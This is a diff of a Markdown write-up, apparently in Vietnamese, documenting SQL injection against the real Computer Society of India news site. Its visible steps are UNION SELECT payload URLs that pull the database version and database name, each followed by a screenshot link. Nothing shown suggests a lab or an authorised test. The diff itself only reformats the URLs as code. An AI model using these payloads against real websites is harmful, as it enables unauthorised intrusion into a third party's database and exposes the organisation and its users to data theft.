@@ -40,13 +40,13 @@ Kiểm tra trên web "Computer Society of India" `https://csi-india.org/news/ind
 
 **2. Version**
 
-https://csi-india.org/news/index.php?id=-18+UNION+SELECT+1,2,3,version(),5,6,7,8
+`https://csi-india.org/news/index.php?id=-18+UNION+SELECT+1,2,3,version(),5,6,7,8`
 
 ![image](https://github.com/user-attachments/assets/e623bf1a-727f-4a23-b0a4-2b80b280a6cb)
 
 **3. Database**
 
-https://csi-india.org/news/index.php?id=-18+UNION+SELECT+1,2,3,database(),5,6,7,8
+`https://csi-india.org/news/index.php?id=-18+UNION+SELECT+1,2,3,database(),5,6,7,8`
 
 ![image](https://github.com/user-attachments/assets/12a78158-d713-44f4-add8-74f6ae91d9fa)
 
